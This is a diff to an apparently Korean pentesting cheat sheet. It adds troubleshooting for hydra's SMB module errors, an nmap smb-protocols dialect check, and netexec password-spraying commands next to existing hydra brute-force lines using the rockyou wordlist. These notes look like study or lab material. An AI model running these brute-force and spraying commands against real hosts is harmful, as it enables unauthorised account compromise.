@@ -126,9 +126,30 @@ Registry.xml, Groups.xml               -> GPP cpassword (08_GPP_cPassword_Descri
 # hydra
 hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://<IP>
 hydra -L users.txt -P passwords.txt smb://<IP>
-# SMBv1 인증 지원을 안해줄 경우 nxc로 하기 
 
-# netexec
+# 트러블 슈팅 - invalid reply from target
+원인:
+- 비밀번호 실패가 아니라 Hydra의 smb 모듈이 서버 응답을 처리하지 못한 오류
+- nmap으로 정확한 지원 버전 확인했을 때 아래 와 같다면 버전 변경(smb를 smb2나 smb3로 변경)으로 해결 가능
+
+nmap -p445 --script smb-protocols <IP>
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-protocols:
+|   dialects:
+|     2.0.2
+|     2.1
+|     3.0
+|     3.0.2
+|_    3.1.1
+
+
+____________________________________________________________________________/
+
+# netexec - hydra가 SMBv1 인증 지원을 안해줄 경우 nxc로도 가능
 nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success
 nxc smb <IP> -u admin -p passwords.txt
 # txt 파일의 문자 인코딩 생길 경우 (UnicodeDecodeError: Could not decode password file. Make sure the file only contains UTF-8 characters.)
